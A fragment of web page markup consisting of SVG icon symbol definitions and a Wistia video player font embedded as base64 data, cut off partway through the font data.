<path fill-rule="evenodd" clip-rule="evenodd" d="M6 10C4.9 10 4 10.9 4 12C4 13.1 4.9 14 6 14C7.1 14 8 13.1 8 12C8 10.9 7.1 10 6 10ZM18 10C16.9 10 16 10.9 16 12C16 13.1 16.9 14 18 14C19.1 14 20 13.1 20 12C20 10.9 19.1 10 18 10ZM10 12C10 10.9 10.9 10 12 10C13.1 10 14 10.9 14 12C14 13.1 13.1 14 12 14C10.9 14 10 13.1 10 12Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Music" viewBox="0 0 24 24">
<path d="M21 3H3C1.9 3 1 3.9 1 5V19C1 20.1 1.9 21 3 21H21C22.1 21 23 20.1 23 19V5C23 3.9 22.1 3 21 3ZM21 19H3V5H21V19ZM8 15C8 13.34 9.34 12 11 12C11.35 12 11.69 12.07 12 12.18V6H17V8H14V15.03C13.98 16.67 12.65 18 11 18C9.34 18 8 16.66 8 15Z" fill="currentColor"></path>
</symbol><symbol id="icon__People" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M9 12C10.93 12 12.5 10.43 12.5 8.5C12.5 6.57 10.93 5 9 5C7.07 5 5.5 6.57 5.5 8.5C5.5 10.43 7.07 12 9 12ZM2 17.25C2 14.92 6.66 13.75 9 13.75C11.34 13.75 16 14.92 16 17.25V19H2V17.25ZM9 15.75C7.21 15.75 5.18 16.42 4.34 17H13.66C12.82 16.42 10.79 15.75 9 15.75ZM10.5 8.5C10.5 7.67 9.83 7 9 7C8.17 7 7.5 7.67 7.5 8.5C7.5 9.33 8.17 10 9 10C9.83 10 10.5 9.33 10.5 8.5ZM16.04 13.81C17.2 14.65 18 15.77 18 17.25V19H22V17.25C22 15.23 18.5 14.08 16.04 13.81ZM18.5 8.5C18.5 10.43 16.93 12 15 12C14.46 12 13.96 11.87 13.5 11.65C14.13 10.76 14.5 9.67 14.5 8.5C14.5 7.33 14.13 6.24 13.5 5.35C13.96 5.13 14.46 5 15 5C16.93 5 18.5 6.57 18.5 8.5Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__MoreVertical" viewBox="0 0 24 24">
<g id="more_vert">
<path id="icon/navigation/more_vert_24px" fill-rule="evenodd" clip-rule="evenodd" d="M12 8C13.1 8 14 7.1 14 6C14 4.9 13.1 4 12 4C10.9 4 10 4.9 10 6C10 7.1 10.9 8 12 8ZM12 10C10.9 10 10 10.9 10 12C10 13.1 10.9 14 12 14C13.1 14 14 13.1 14 12C14 10.9 13.1 10 12 10ZM10 18C10 16.9 10.9 16 12 16C13.1 16 14 16.9 14 18C14 19.1 13.1 20 12 20C10.9 20 10 19.1 10 18Z" fill="CurrentColor"></path>
</g>
</symbol><symbol id="icon__PersonOutline" viewBox="0 0 24 24">
<path d="M12 5.9C13.16 5.9 14.1 6.84 14.1 8C14.1 9.16 13.16 10.1 12 10.1C10.84 10.1 9.9 9.16 9.9 8C9.9 6.84 10.84 5.9 12 5.9ZM12 14.9C14.97 14.9 18.1 16.36 18.1 17V18.1H5.9V17C5.9 16.36 9.03 14.9 12 14.9ZM12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4ZM12 13C9.33 13 4 14.34 4 17V20H20V17C20 14.34 14.67 13 12 13Z" fill="currentColor"></path>
</symbol><symbol id="icon__Offer" viewBox="0 0 24 24">
<path d="M21.41 11.58L12.41 2.58C12.05 2.22 11.55 2 11 2H4C2.9 2 2 2.9 2 4V11C2 11.55 2.22 12.05 2.59 12.42L11.59 21.42C11.95 21.78 12.45 22 13 22C13.55 22 14.05 21.78 14.41 21.41L21.41 14.41C21.78 14.05 22 13.55 22 13C22 12.45 21.77 11.94 21.41 11.58ZM13 20.01L4 11V4H11V3.99L20 12.99L13 20.01Z" fill="currentColor"></path>
<path d="M6.5 8C7.32843 8 8 7.32843 8 6.5C8 5.67157 7.32843 5 6.5 5C5.67157 5 5 5.67157 5 6.5C5 7.32843 5.67157 8 6.5 8Z" fill="currentColor"></path>
</symbol><symbol id="icon__Person" viewBox="0 0 24 24">
  <path d="M0 0h24v24H0z" fill="none"></path>
  <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="currentColor"></path>
</symbol><symbol id="icon__QuestionMark" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M8 10C8 7.79 9.79 6 12 6C14.21 6 16 7.79 16 10C16 11.2829 15.21 11.9733 14.4408 12.6455C13.711 13.2833 13 13.9046 13 15H11C11 13.1787 11.9421 12.4566 12.7704 11.8217C13.4202 11.3236 14 10.8792 14 10C14 8.9 13.1 8 12 8C10.9 8 10 8.9 10 10H8ZM13 16V18H11V16H13Z" fill="currentColor"></path>
</symbol><symbol id="icon__Plus" viewBox="0 0 24 24">
<path d="M19 13H13V19H11V13H5V11H11V5H13V11H19V13Z" fill="currentColor"></path>
</symbol><symbol id="icon__Refresh" viewBox="0 0 24 24">
  <path d="M0 0h24v24H0z" fill="none"></path>
  <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" fill="currentColor"></path>
</symbol><symbol id="icon__Quiz" viewBox="0 0 24 24">
<path d="M16.54 10.9999L13 7.45993L14.41 6.04993L16.53 8.16993L20.77 3.92993L22.18 5.33993L16.54 10.9999ZM11 6.99993H2V8.99993H11V6.99993ZM21 13.4099L19.59 11.9999L17 14.5899L14.41 11.9999L13 13.4099L15.59 15.9999L13 18.5899L14.41 19.9999L17 17.4099L19.59 19.9999L21 18.5899L18.41 15.9999L21 13.4099ZM11 14.9999H2V16.9999H11V14.9999Z" fill="currentColor"></path>
</symbol><symbol id="icon__Receipt" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M18 2L19.5 3.5L21 2V22L19.5 20.5L18 22L16.5 20.5L15 22L13.5 20.5L12 22L10.5 20.5L9 22L7.5 20.5L6 22L4.5 20.5L3 22V2L4.5 3.5L6 2L7.5 3.5L9 2L10.5 3.5L12 2L13.5 3.5L15 2L16.5 3.5L18 2ZM5 4.91V19.09H19V4.91H5ZM12 15V17H6V15H12ZM12 13V11H6V13H12ZM18 7V9H6V7H18ZM16.4 17H15.2V16.4H14V15.2H16.4V14.6H14.6C14.27 14.6 14 14.33 14 14V12.2C14 11.87 14.27 11.6 14.6 11.6H15.2V11H16.4V11.6H17.6V12.8H15.2V13.4H17C17.33 13.4 17.6 13.67 17.6 14V15.8C17.6 16.13 17.33 16.4 17 16.4H16.4V17Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Rocket" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M21.8978 2.10857C22.3478 2.54857 22.5278 3.33857 22.5278 4.82857C22.5783 6.97019 22.0573 9.0866 21.0186 10.9601C19.9799 12.8337 18.4609 14.3967 16.6178 15.4886L16.4278 18.5886C16.4055 18.9051 16.3017 19.2105 16.1265 19.4751C15.9513 19.7397 15.7106 19.9545 15.4278 20.0986L10.1778 22.9286C10.0961 22.9737 10.0037 22.9959 9.91038 22.993C9.81707 22.9901 9.72626 22.9621 9.64749 22.912C9.56873 22.8618 9.50491 22.7914 9.46274 22.7081C9.42057 22.6248 9.4016 22.5317 9.40783 22.4386L9.55783 18.9586L9.02783 19.2186L4.87783 15.0686L5.17783 14.3886L1.55783 14.6186C1.4649 14.6235 1.37233 14.6038 1.28941 14.5616C1.2065 14.5193 1.13617 14.456 1.08549 14.3779C1.03482 14.2999 1.00558 14.2099 1.00072 14.117C0.995866 14.024 1.01556 13.9315 1.05783 13.8486L3.81783 8.50857C3.96606 8.22289 4.18589 7.98057 4.45583 7.80529C4.72576 7.63001 5.03655 7.52777 5.35783 7.50857L8.43783 7.33857C9.56424 5.4895 11.1636 3.97442 13.0708 2.9496C14.9781 1.92478 17.1242 1.42733 19.2878 1.50857C20.7378 1.50857 21.4478 1.66857 21.8978 2.10857ZM7.22783 9.39857L5.54783 9.50857L4.03783 12.5086L5.64783 12.3586L7.22783 9.39857ZM11.4778 19.9386L14.3578 18.3786L14.4678 16.6986L11.5478 18.2786L11.4778 19.9386ZM9.42783 16.7986L14.8578 14.1286H14.8978C16.6207 13.2815 18.0658 11.96 19.0631 10.3195C20.0605 8.67911 20.5686 6.78797 20.5278 4.86857C20.5356 4.45041 20.5088 4.03233 20.4478 3.61857C20.0518 3.54718 19.6503 3.51038 19.2478 3.50857C17.2363 3.41389 15.2425 3.9245 13.5241 4.97445C11.8057 6.02439 10.4415 7.56545 9.60783 9.39857L7.26783 14.6286L9.42783 16.7986ZM18.2179 7.53857C18.2179 8.54925 17.3985 9.36857 16.3879 9.36857C15.3772 9.36857 14.5579 8.54925 14.5579 7.53857C14.5579 6.52789 15.3772 5.70857 16.3879 5.70857C17.3985 5.70857 18.2179 6.52789 18.2179 7.53857Z" fill="currentColor"></path>
</symbol><symbol id="icon__Reply" viewBox="0 0 24 24">
  <path d="M0 0h24v24H0z" fill="none"></path>
  <path d="M10 9V5l-7 7 7 7v-4.1c5 0 8.5 1.6 11 5.1-1-5-4-10-11-11z" fill="currentColor"></path>
</symbol><symbol id="icon__RocketFilled" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M20.8978 0.607853C20.4678 0.177853 19.7378 0.00785284 18.2678 0.00785284C16.1075 -0.0697831 13.9655 0.429387 12.0621 1.45403C10.1587 2.47868 8.56257 3.99182 7.43783 5.83785L4.34783 6.00785C4.02926 6.02751 3.72138 6.13015 3.45474 6.30557C3.1881 6.48099 2.97198 6.72309 2.82783 7.00785L0.0578258 12.3479C0.0155603 12.4308 -0.00413424 12.5233 0.000722499 12.6162C0.00557924 12.7092 0.034816 12.7992 0.0854931 12.8772C0.13617 12.9553 0.206501 13.0186 0.289415 13.0608C0.372328 13.1031 0.464901 13.1227 0.557826 13.1179L4.18783 12.8879L3.87783 13.5679L8.02783 17.7179L8.55783 17.4579L8.40783 20.9379C8.40378 21.0313 8.42455 21.1242 8.46803 21.2071C8.51152 21.2899 8.57616 21.3598 8.6554 21.4096C8.73463 21.4594 8.82563 21.4873 8.91915 21.4905C9.01267 21.4937 9.10536 21.4721 9.18783 21.4279L14.4278 18.5979C14.7106 18.4538 14.9513 18.239 15.1265 17.9744C15.3017 17.7098 15.4055 17.4044 15.4278 17.0879L15.6178 13.9879C17.4652 12.9008 18.9877 11.3387 20.027 9.46407C21.0664 7.58942 21.5846 5.47059 21.5278 3.32785C21.5378 1.83785 21.3478 1.00785 20.8978 0.607853ZM4.64783 10.8579L3.03783 11.0079L4.55783 8.00785L6.26783 7.91785L4.64783 10.8579ZM13.4078 16.8579L10.5178 18.4179L10.5878 16.7579L13.5078 15.1779L13.4078 16.8579ZM16.9878 7.61785C16.6721 7.93478 16.2694 8.15089 15.8308 8.23879C15.3922 8.3267 14.9373 8.28245 14.5238 8.11165C14.1104 7.94085 13.7569 7.65118 13.5082 7.27934C13.2595 6.9075 13.1267 6.47021 13.1267 6.02285C13.1267 5.5755 13.2595 5.13821 13.5082 4.76637C13.7569 4.39452 14.1104 4.10486 14.5238 3.93406C14.9373 3.76326 15.3922 3.71901 15.8308 3.80691C16.2694 3.89482 16.6721 4.11092 16.9878 4.42785C17.1998 4.63796 17.368 4.88797 17.4828 5.16345C17.5976 5.43892 17.6567 5.73441 17.6567 6.03285C17.6567 6.3313 17.5976 6.62678 17.4828 6.90226C17.368 7.17773 17.1998 7.42774 16.9878 7.63785V7.61785Z" fill="currentColor"></path>
</symbol><symbol id="icon__Sales" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20ZM9.97 9.47C9.97 10.2 10.54 10.69 12.31 11.14C14.07 11.6 15.96 12.36 15.97 14.56C15.96 16.17 14.76 17.04 13.24 17.33V19H10.9V17.3C9.4 16.99 8.14 16.03 8.04 14.33H9.76C9.85 15.25 10.48 15.97 12.08 15.97C13.79 15.97 14.18 15.11 14.18 14.58C14.18 13.86 13.79 13.17 11.84 12.71C9.67 12.19 8.18 11.29 8.18 9.5C8.18 7.99 9.39 7.01 10.9 6.69V5H13.23V6.71C14.85 7.11 15.67 8.34 15.72 9.68H14.01C13.97 8.7 13.45 8.04 12.07 8.04C10.76 8.04 9.97 8.63 9.97 9.47Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__SaveAlt" viewBox="0 0 24 24">
  <path d="M19 12V19H5V12H3V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V12H19ZM13 12.67L15.59 10.09L17 11.5L12 16.5L7 11.5L8.41 10.09L11 12.67V3H13V12.67Z" fill="currentColor"></path>
</symbol><symbol id="icon__School" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 3L1 9L5 11.18V17.18L12 21L19 17.18V11.18L21 10.09V17H23V9L12 3ZM18.82 9L12 12.72L5.18 9L12 5.28L18.82 9ZM12 18.72L17 15.99V12.27L12 15L7 12.27V15.99L12 18.72Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Search" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M17.2499 15.0583L20.7552 18.5633C21.0822 18.8938 21.0822 19.4281 20.7517 19.7586L19.7567 20.7535C19.4297 21.0839 18.8953 21.0839 18.5648 20.7535L15.0595 17.2485C14.9013 17.0903 14.8134 16.8758 14.8134 16.6508V16.0778C13.5723 17.0481 12.0112 17.6246 10.313 17.6246C6.27329 17.6246 3 14.3517 3 10.3123C3 6.27297 6.27329 3 10.313 3C14.3528 3 17.6261 6.27297 17.6261 10.3123C17.6261 12.0103 17.0495 13.5712 16.0791 14.8122H16.6522C16.8772 14.8122 17.0917 14.9001 17.2499 15.0583ZM5.81277 10.3123C5.81277 12.8013 7.82737 14.8122 10.3131 14.8122C12.8023 14.8122 14.8134 12.7978 14.8134 10.3123C14.8134 7.82332 12.7988 5.81243 10.3131 5.81243C7.82386 5.81243 5.81277 7.82684 5.81277 10.3123Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__SchoolFilled" viewBox="0 0 24 24">
<path d="M5 13.18V17.18L12 21L19 17.18V13.18L12 17L5 13.18ZM12 3L1 9L12 15L21 10.09V17H23V9L12 3Z" fill="currentColor"></path>
</symbol><symbol id="icon__SettingsFilled" viewBox="0 0 24 24">
<path d="M19.1391 12.9359C19.1751 12.6359 19.1991 12.3239 19.1991 11.9999C19.1991 11.6759 19.1751 11.3639 19.1271 11.0639L21.1551 9.4799C21.3351 9.3359 21.3831 9.0719 21.2751 8.8679L19.3551 5.5439C19.2351 5.3279 18.9831 5.2559 18.7671 5.3279L16.3791 6.2879C15.8751 5.9039 15.3471 5.5919 14.7591 5.3519L14.3991 2.8079C14.3631 2.5679 14.1591 2.3999 13.9191 2.3999H10.0791C9.83913 2.3999 9.64713 2.5679 9.61113 2.8079L9.25113 5.3519C8.66313 5.5919 8.12313 5.9159 7.63113 6.2879L5.24313 5.3279C5.02713 5.2439 4.77513 5.3279 4.65513 5.5439L2.73513 8.8679C2.61513 9.0839 2.66313 9.3359 2.85513 9.4799L4.88313 11.0639C4.83513 11.3639 4.79913 11.6879 4.79913 11.9999C4.79913 12.3119 4.82313 12.6359 4.87113 12.9359L2.84313 14.5199C2.66313 14.6639 2.61513 14.9279 2.72313 15.1319L4.64313 18.4559C4.76313 18.6719 5.01513 18.7439 5.23113 18.6719L7.61913 17.7119C8.12313 18.0959 8.65113 18.4079 9.23913 18.6479L9.59913 21.1919C9.64713 21.4319 9.83913 21.5999 10.0791 21.5999H13.9191C14.1591 21.5999 14.3631 21.4319 14.3871 21.1919L14.7471 18.6479C15.3351 18.4079 15.8751 18.0839 16.3671 17.7119L18.7551 18.6719C18.9711 18.7559 19.2231 18.6719 19.3431 18.4559L21.2631 15.1319C21.3831 14.9159 21.3351 14.6639 21.1431 14.5199L19.1391 12.9359ZM11.9991 15.5999C10.0191 15.5999 8.39913 13.9799 8.39913 11.9999C8.39913 10.0199 10.0191 8.3999 11.9991 8.3999C13.9791 8.3999 15.5991 10.0199 15.5991 11.9999C15.5991 13.9799 13.9791 15.5999 11.9991 15.5999Z" fill="currentColor"></path>
</symbol><symbol id="icon__Settings" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M19.5023 12C19.5023 12.34 19.4723 12.66 19.4323 12.98L21.5423 14.63C21.7323 14.78 21.7823 15.05 21.6623 15.27L19.6623 18.73C19.5723 18.89 19.4023 18.98 19.2323 18.98C19.1723 18.98 19.1123 18.97 19.0523 18.95L16.5623 17.95C16.0423 18.34 15.4823 18.68 14.8723 18.93L14.4923 21.58C14.4623 21.82 14.2523 22 14.0023 22H10.0023C9.75228 22 9.54228 21.82 9.51228 21.58L9.13228 18.93C8.52228 18.68 7.96228 18.35 7.44228 17.95L4.95228 18.95C4.90228 18.97 4.84228 18.98 4.78228 18.98C4.60228 18.98 4.43228 18.89 4.34228 18.73L2.34228 15.27C2.22228 15.05 2.27228 14.78 2.46228 14.63L4.57228 12.98C4.53228 12.66 4.50228 12.33 4.50228 12C4.50228 11.67 4.53228 11.34 4.57228 11.02L2.46228 9.37C2.27228 9.22 2.21228 8.95 2.34228 8.73L4.34228 5.27C4.43228 5.11 4.60228 5.02 4.77228 5.02C4.83228 5.02 4.89228 5.03 4.95228 5.05L7.44228 6.05C7.96228 5.66 8.52228 5.32 9.13228 5.07L9.51228 2.42C9.54228 2.18 9.75228 2 10.0023 2H14.0023C14.2523 2 14.4623 2.18 14.4923 2.42L14.8723 5.07C15.4823 5.32 16.0423 5.65 16.5623 6.05L19.0523 5.05C19.1023 5.03 19.1623 5.02 19.2223 5.02C19.4023 5.02 19.5723 5.11 19.6623 5.27L21.6623 8.73C21.7823 8.95 21.7323 9.22 21.5423 9.37L19.4323 11.02C19.4723 11.34 19.5023 11.66 19.5023 12ZM17.5023 12C17.5023 11.79 17.4923 11.58 17.4523 11.27L17.3123 10.14L18.2023 9.44L19.2723 8.59L18.5723 7.38L17.3023 7.89L16.2423 8.32L15.3323 7.62C14.9323 7.32 14.5323 7.09 14.1023 6.91L13.0423 6.48L12.8823 5.35L12.6923 4H11.3023L11.1023 5.35L10.9423 6.48L9.88228 6.91C9.47228 7.08 9.06228 7.32 8.63228 7.64L7.73228 8.32L6.69228 7.9L5.42228 7.39L4.72228 8.6L5.80228 9.44L6.69228 10.14L6.55228 11.27C6.52228 11.57 6.50228 11.8 6.50228 12C6.50228 12.2 6.52228 12.43 6.55228 12.74L6.69228 13.87L5.80228 14.57L4.72228 15.41L5.42228 16.62L6.69228 16.11L7.75228 15.68L8.66228 16.38C9.06228 16.68 9.46228 16.91 9.89228 17.09L10.9523 17.52L11.1123 18.65L11.3023 20H12.7023L12.9023 18.65L13.0623 17.52L14.1223 17.09C14.5323 16.92 14.9423 16.68 15.3723 16.36L16.2723 15.68L17.3123 16.1L18.5823 16.61L19.2823 15.4L18.2023 14.56L17.3123 13.86L17.4523 12.73C17.4823 12.43 17.5023 12.21 17.5023 12ZM12.0023 8C9.79228 8 8.00228 9.79 8.00228 12C8.00228 14.21 9.79228 16 12.0023 16C14.2123 16 16.0023 14.21 16.0023 12C16.0023 9.79 14.2123 8 12.0023 8ZM10.0023 12C10.0023 13.1 10.9023 14 12.0023 14C13.1023 14 14.0023 13.1 14.0023 12C14.0023 10.9 13.1023 10 12.0023 10C10.9023 10 10.0023 10.9 10.0023 12Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Sort" viewBox="0 0 24 24">
  <path d="M0 0h24v24H0z" fill="none"></path>
  <path d="M3 18h6v-2H3v2zM3 6v2h18V6H3zm0 7h12v-2H3v2z" fill="currentColor"></path>
</symbol><symbol id="icon__Star" viewBox="0 0 24 24">
<path d="M20 7.24L12.81 6.62L10 0L7.19 6.63L0 7.24L5.46 11.97L3.82 19L10 15.27L16.18 19L14.55 11.97L20 7.24ZM10 13.4L6.24 15.67L7.24 11.39L3.92 8.51L8.3 8.13L10 4.1L11.71 8.14L16.09 8.52L12.77 11.4L13.77 15.68L10 13.4Z" fill="currentColor"></path>
</symbol><symbol id="icon__StarCircle" viewBox="0 0 24 24">
<path d="M11.99 2C6.47 2 2 6.48 2 12C2 17.52 6.47 22 11.99 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 11.99 2ZM19.47 9.16L14.46 8.73L12.46 4.02C15.67 4.21 18.37 6.29 19.47 9.16ZM14.4 15.42L12 13.98L9.61 15.42L10.24 12.7L8.13 10.87L10.91 10.63L12 8.06L13.09 10.62L15.87 10.86L13.76 12.69L14.4 15.42ZM11.54 4.02L9.54 8.74L4.52 9.17C5.62 6.29 8.32 4.2 11.54 4.02ZM4 12C4 11.36 4.08 10.74 4.23 10.14L8.02 13.42L6.91 18.17C5.13 16.7 4 14.48 4 12ZM7.84 18.82L12 16.31L16.16 18.81C14.94 19.56 13.52 20 11.99 20C10.47 20 9.05 19.56 7.84 18.82ZM17.09 18.17L15.98 13.42L19.77 10.14C19.91 10.73 20 11.36 20 12C20 14.48 18.86 16.7 17.09 18.17Z" fill="currentColor"></path>
</symbol><symbol id="icon__StarFilled" viewBox="0 0 24 24">
<path d="M10 15.27L16.18 19L14.54 11.97L20 7.24L12.81 6.63L10 0L7.19 6.63L0 7.24L5.46 11.97L3.82 19L10 15.27Z" fill="currentColor"></path>
</symbol><symbol id="icon__Storage" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M2 4V8H22V4H2ZM22 20H2V16H22V20ZM6 17H4V19H6V17ZM4 7H6V5H4V7ZM2 14H22V10H2V14ZM6 11H4V13H6V11Z" fill="currentColor"></path>
</symbol><symbol id="icon__Subject" viewBox="0 0 24 24">
<path d="M14 17H4V19H14V17ZM20 9H4V11H20V9ZM4 15H20V13H4V15ZM4 5V7H20V5H4Z" fill="currentColor"></path>
</symbol><symbol id="icon__Timeline" viewBox="0 0 24 24">
<path d="M23 8C23 9.1 22.1 10 21 10C20.82 10 20.65 9.98 20.49 9.93L16.93 13.48C16.98 13.64 17 13.82 17 14C17 15.1 16.1 16 15 16C13.9 16 13 15.1 13 14C13 13.82 13.02 13.64 13.07 13.48L10.52 10.93C10.36 10.98 10.18 11 10 11C9.82 11 9.64 10.98 9.48 10.93L4.93 15.49C4.98 15.65 5 15.82 5 16C5 17.1 4.1 18 3 18C1.9 18 1 17.1 1 16C1 14.9 1.9 14 3 14C3.18 14 3.35 14.02 3.51 14.07L8.07 9.52C8.02 9.36 8 9.18 8 9C8 7.9 8.9 7 10 7C11.1 7 12 7.9 12 9C12 9.18 11.98 9.36 11.93 9.52L14.48 12.07C14.64 12.02 14.82 12 15 12C15.18 12 15.36 12.02 15.52 12.07L19.07 8.51C19.02 8.35 19 8.18 19 8C19 6.9 19.9 6 21 6C22.1 6 23 6.9 23 8Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__TrendingDown" viewBox="0 0 24 24">
  <path d="M16 18L18.29 15.71L13.41 10.83L9.41 14.83L2 7.41L3.41 6L9.41 12L13.41 8L19.71 14.29L22 12V18H16Z" fill="currentColor"></path>
</symbol><symbol id="icon__TrendingUp" viewBox="0 0 24 24">
  <path d="M16 6L18.29 8.29L13.41 13.17L9.41 9.17L2 16.59L3.41 18L9.41 12L13.41 16L19.71 9.71L22 12V6H16Z" fill="currentColor"></path>
</symbol><symbol id="icon__Trophy" viewBox="0 0 24 24">
<path d="M19 5H17V3H7V5H5C3.9 5 3 5.9 3 7V8C3 10.55 4.92 12.63 7.39 12.94C8.02 14.44 9.37 15.57 11 15.9V19H7V21H17V19H13V15.9C14.63 15.57 15.98 14.44 16.61 12.94C19.08 12.63 21 10.55 21 8V7C21 5.9 20.1 5 19 5ZM5 8V7H7V10.82C5.84 10.4 5 9.3 5 8ZM12 14C10.35 14 9 12.65 9 11V5H15V11C15 12.65 13.65 14 12 14ZM19 8C19 9.3 18.16 10.4 17 10.82V7H19V8Z" fill="currentColor"></path>
</symbol><symbol id="icon__Upload" viewBox="0 0 24 24">
    <path fill-rule="evenodd" clip-rule="evenodd" d="M12 4C15.64 4 18.67 6.59 19.35 10.04C21.95 10.22 24 12.36 24 15C24 17.76 21.76 20 19 20H6C2.69 20 0 17.31 0 14C0 10.91 2.34 8.36 5.35 8.04C6.6 5.64 9.11 4 12 4ZM14 14V18H10V14H7L12 9L17 14H14Z" fill="currentColor"></path>
</symbol><symbol id="icon__VideoCam" viewBox="0 0 24 24">
<path d="M17 10.5V7C17 6.45 16.55 6 16 6H4C3.45 6 3 6.45 3 7V17C3 17.55 3.45 18 4 18H16C16.55 18 17 17.55 17 17V13.5L21 17.5V6.5L17 10.5Z" fill="currentColor"></path>
</symbol><symbol id="icon__Video" viewBox="0 0 24 24">
<path d="M21 3H3C1.89 3 1 3.89 1 5V17C1 18.1 1.89 19 3 19H8V21H16V19H21C22.1 19 22.99 18.1 22.99 17L23 5C23 3.89 22.1 3 21 3ZM21 17H3V5H21V17ZM16 11L9 15V7L16 11Z" fill="currentColor"></path>
</symbol><symbol id="icon__VolumeUp" viewBox="0 0 24 24">
<path d="M3 8.99998V15H7L12 20V3.99998L7 8.99998H3ZM16.5 12C16.5 10.23 15.48 8.70998 14 7.96998V16.02C15.48 15.29 16.5 13.77 16.5 12ZM14 3.22998V5.28998C16.89 6.14998 19 8.82998 19 12C19 15.17 16.89 17.85 14 18.71V20.77C18.01 19.86 21 16.28 21 12C21 7.71998 18.01 4.13998 14 3.22998Z" fill="currentColor"></path>
</symbol><symbol id="icon__Vote" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M11.34 15.0207C11.73 15.4107 12.36 15.4107 12.75 15.0207L19.11 8.66065C19.5 8.27065 19.5 7.64065 19.11 7.25065L14.16 2.30065C13.78 1.90065 13.15 1.90065 12.76 2.29065L6.39 8.66065C6 9.05065 6 9.68065 6.39 10.0707L11.34 15.0207ZM17.32 13.0007H18L21 16.0007V20.0007C21 21.1107 20.1 22.0007 19 22.0007H4.99C3.89 22.0007 3 21.1007 3 20.0007V16.0007L6 13.0007H6.83L8.83 15.0007H6.78L5 17.0007H19L17.23 15.0007H15.32L17.32 13.0007ZM5 20.0007H19V19.0007H5V20.0007ZM17 7.95065L13.46 4.41065L8.51 9.36065L12.05 12.9007L17 7.95065Z" fill="currentColor"></path>
</symbol><symbol id="icon__X" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M14.0823 12L18.7951 7.28732C19.0677 7.01477 19.0677 6.57246 18.7951 6.29946L17.7001 5.20442C17.4275 4.93186 16.9852 4.93186 16.7122 5.20442L11.9998 9.91753L7.28696 5.20486C7.01439 4.9323 6.57207 4.9323 6.29907 5.20486L5.20443 6.29946C4.93186 6.57202 4.93186 7.01433 5.20443 7.28732L9.91725 12L5.20443 16.7127C4.93186 16.9852 4.93186 17.4275 5.20443 17.7005L6.2995 18.7956C6.57207 19.0681 7.01439 19.0681 7.2874 18.7956L11.9998 14.0825L16.7126 18.7951C16.9852 19.0677 17.4275 19.0677 17.7005 18.7951L18.7956 17.7001C19.0681 17.4275 19.0681 16.9852 18.7956 16.7122L14.0823 12Z" fill="CurrentColor"></path>
</symbol></svg>
</div></div>
<style>

@font-face { font-family: WistiaPlayerInterNumbersSemiBold; font-feature-settings: "tnum"; src: url("data:application/x-font-woff;charset=utf-8;base64,d09GMk9UVE8AAAaMAAwAAAAACgAAAAZBAAMD1wAAAAAAAAAAAAAAAAAAAAAAAAAADYpwGhQbIBwqBmAAgTIBNgIkAzAEBgWDGgcgGykJEZWkARP8KHCbm2tEznyIN98tPTUk9Ig3oiVV3pbDIzXa+f/fZgXpALFTZhBoMVFC9cp036dXvRKVmVnsxe+D+1NDQI5lG7ikZWEINIElTeBIdnxlhauQ5GQtoLHA/wN0riVdSx5xgbxF3KTbgnjVQ4B9P7YqCx7FpEZK+6ilx0AoopUh4aExJEKmkU+0ncdr4iFfKhdSFD9y91LCRaxNbVqvi0dND3rxI7ndUDR7EiwT3bhiua9krFA0oepCy2hCjwmjnjDjKjNTDz2ZuHtN8820Wfw/l8u4w4yV/f8/6uscs5rmiN00LcP4hAofyZUSyS3WinX0RGFFtnGrjj36x6dlNa57+PLTlrUisH2n9orfgd+R34XfDd0NsWDXwfwhvKHpbs3UBni37dBlPvO4KYn/PgylilcgSdw6sjsSSxsRGfIJgqhi14bKZCHcQvjUh/+3HMotTYrGLVYCxyMFjEnYC98yTAp6atAKVxaZ9eu2NMji8WTj4w/Y34elD60PPwb5bEywLqAX/amwmUo6TBCy14N/TL44jb3sE5JdUIPXXI0RBSoGt3BUObn4agKGIxxQhlyQacbstK4fS2mZoBtFNQ1bd+4zND2vQu6anl7gWFOj8MV2DVMtU44xMhpwElrrjA7zO5IqWojd/v1Vso6cqp91zC2YrGhDOy07Iqyza2q9smDIwUYek0AWbCt/8x78QmrzayQ6xtpmqfCYsLfgU9HdeP3UqutZTTNd/9Q8k08XzXzIxSdvLPda8YaeeZnkxUwql0nDKyUYdaWZjGAy7UDLHpVqBVHTxSV0wBy21El9u/491ik2J3YkdiP2LPZL41RBeeN